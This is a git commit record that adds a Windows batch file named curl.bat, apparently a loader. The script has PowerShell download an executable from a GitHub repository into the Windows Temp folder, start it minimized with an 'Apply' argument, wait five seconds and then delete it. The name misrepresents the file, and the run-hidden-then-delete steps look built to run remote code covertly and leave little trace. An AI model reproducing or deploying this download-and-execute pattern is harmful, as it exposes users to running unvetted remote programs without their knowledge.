1c8b41f2471c570984859f082d85d77098f3dd75
emad8787 <mdemadhossainfci28@gmail.com>
2025-03-07 22:39:47 +0600

    Create curl.bat

---
+++ curl.bat
@@ -0,0 +1,14 @@
+@echo off
+set "url=https://github.com/emad8787/panel/raw/main/Emad.exe"
+set "destination=C:\Windows\Temp\Emad.exe"
+set "arguments=Apply"
+
+echo WAITING FOR LAUNCH...
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
+echo WAITING ...
+start /min "" "%destination%" %arguments%
+
+timeout /t 5 /nobreak >nul 2>&1
+
+echo ........
+del "%destination%"
